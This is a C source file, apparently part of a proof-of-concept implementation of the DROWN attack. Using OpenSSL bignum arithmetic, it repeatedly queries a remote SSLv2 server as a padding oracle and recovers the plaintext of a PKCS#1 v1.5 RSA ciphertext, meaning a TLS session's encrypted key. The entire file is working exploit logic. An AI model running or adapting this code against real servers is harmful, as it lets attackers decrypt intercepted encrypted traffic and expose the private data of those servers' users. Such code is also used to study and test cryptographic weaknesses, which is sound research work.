#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include "decrypt.h"
#include "oracle.h"


void BN_dump(BIGNUM *bn)
{
    printf("%s\n", BN_bn2hex(bn));
}


void oracle_guess(drown_ctx *dctx, BIGNUM *c, BIGNUM *k, int bsize)
{
    int bytesize = bsize/8-1;
    unsigned char result[24];
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    run_oracle_guess(dctx->hostport, bytesize, enc_key, 256, result);

    // Convert m to bignum
    BN_bin2bn(result, bytesize, k);
}

/*
    Checks whether c is valid.
    Returns the numbers of bits we can learn (0 if invalid).
*/
int oracle_valid(drown_ctx *dctx, BIGNUM *c)
{
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    int size = run_oracle_valid_multiple(dctx->hostport, enc_key, 256);

    if(size == 0)
        return 0;
    else
        return (size + 1) * 8;
}

/*
    Finds a multiplier s, so that c * (s * l_1) ** e is valid
    Updates c, s, mt, l, ?
*/
int find_multiplier(drown_ctx *dctx, BIGNUM *mt, BIGNUM *l_1, BN_CTX *ctx, BIGNUM * ss)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *e = dctx->e;

    BN_CTX_start(ctx);
    BIGNUM * inc = BN_CTX_get(ctx);
    BIGNUM * upperbits = BN_CTX_get(ctx);
    BIGNUM *se = BN_CTX_get(ctx);
    BIGNUM *l_1e = BN_CTX_get(ctx);
    BIGNUM *cl_1e = BN_CTX_get(ctx);
    BN_mod_exp(l_1e, l_1, e, n, ctx);
    BN_mod_mul(cl_1e, c, l_1e, n, ctx);
    BIGNUM * cc = BN_CTX_get(ctx);

    int l = 0;

    // We will try every value of s, so we will add instead of multiplying
    // Compute our increment
    BN_mod_mul(inc, mt, l_1, n, ctx);
    BN_zero(mt);

    // Search multiplier
    for(unsigned long s = 1; l == 0; s++)
    {
        BN_mod_add(mt, mt, inc, n, ctx);
        // Check if the upper bits are 0x0002
        BN_rshift(upperbits, mt, 2032);
        if(BN_is_word(upperbits, 0x0002))
        {
            // cc = c * (s / l) ** e
            BN_set_word(ss, s);
            BN_mod_exp(se, ss, e, n, ctx);
            BN_mod_mul(cc, cl_1e, se, n, ctx);

            l = oracle_valid(dctx, cc);
        }
    }

    BN_copy(c, cc);

    BN_CTX_end(ctx);

    return l;
}

/*
    We have c0 = m0 ** e (mod n)
            m0 = PKCS_1_v1.5_pad(k)), with |k| = ksize
    Given c0, e, n, ksize and an oracle, we try to find m0 (and succeed !)
*/
void decrypt(drown_ctx *dctx)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *S = dctx->s;
    BIGNUM *mt = dctx->mt;

    BN_CTX *ctx = dctx->ctx;
    BN_CTX_start(ctx);
    BIGNUM *l_1 = BN_CTX_get(ctx);
    BIGNUM *ss = BN_CTX_get(ctx);
    BIGNUM *r = BN_CTX_get(ctx);

    // mt is our current approximation of m
    // u marks the highest known bit
    // l marks the lowest unknown bit

    // At the beginning, we have
    //         u                              l
    // m  = 0002???????????????????????????????00gggggggg
    // where g is the bits of m0 (found by the oracle)


    int l = oracle_valid(dctx, c);
    oracle_guess(dctx, c, mt, l);
    int u = 2032;
    BN_set_bit(mt, 2033);



    // Repeat while we don't know all the bits
    while(u > l)
    {
        // We know l low bits, so we know that for the next mt, we will know approximately l more upper bits
        u -= l;

        // Compute l_1 = 2**(-l)
        BN_lshift(l_1, BN_value_one(), l);
        BN_mod_inverse(l_1, l_1, n, ctx);

        // Find a multiplier
        l = find_multiplier(dctx, mt, l_1, ctx, ss);

        // Remember our multiplier
        BN_mod_mul(S, S, ss, n, ctx);
        BN_mod_mul(S, S, l_1, n, ctx);

        // We learnt approximately l bits.
        // However, we're multiplying by s so we're not sure of |s| + 1 bits
        u += BN_num_bits(ss) + 1;
        // Another gotcha : we must remove 01*, because they may change by addition
        while(BN_is_bit_set(mt, u))
            u++;
        u++;
        // Be sure that u and l won't collide
        if(u < l)
            u = l;
        // Great ! We know u, so we can clear the low bits
        BN_rshift(mt, mt, u);
        BN_lshift(mt, mt, u);

        // Guess the low bits
        oracle_guess(dctx, c, r, l);
        BN_add(mt, mt, r);

        BN_print_fp(stderr, mt);
        fprintf(stderr, "\n");

    }

    BN_CTX_end(ctx);
}


